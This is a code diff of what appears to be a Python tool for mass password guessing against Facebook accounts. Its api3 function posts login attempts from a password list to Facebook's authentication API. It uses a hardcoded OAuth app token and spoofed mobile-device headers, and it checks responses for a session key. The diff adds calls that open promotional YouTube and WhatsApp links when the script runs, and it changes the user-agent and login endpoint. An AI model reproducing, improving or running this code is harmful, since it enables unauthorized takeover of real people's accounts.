@@ -1,6 +1,8 @@
 from os import path
 import os,base64,zlib,pip,urllib
 print('\n\033[1;37m install modules...\n It will take some seconds...')
+os.system('xdg-open https://www.youtube.com/@techrahul4794///')
+os.system('xdg-open https://chat.whatsapp.com/Js1oU99b67uGRsaKs88RB7//')
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
@@ -777,14 +779,14 @@ def api3(ids,names,passlist):
                                         'x-fb-sim-hni':str(random.randint(310260, 4000000)),
                                         'x-fb-connection-type':'mobile.LTE',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':'Davik/2.1.0 (Linux; U; Android 12; V2031 Build/SP1A.210812.003) [FBAN/MessengerLite;FBAV/306.0.0.8.76;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/756869315;FBCR/Namaste;FBMF/vivo;FBBD/vivo;FBDV/V2031;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]',
+                                        'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(310260, 4000000)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':'Apache'}
-                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+                                url = 'https://b-api.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
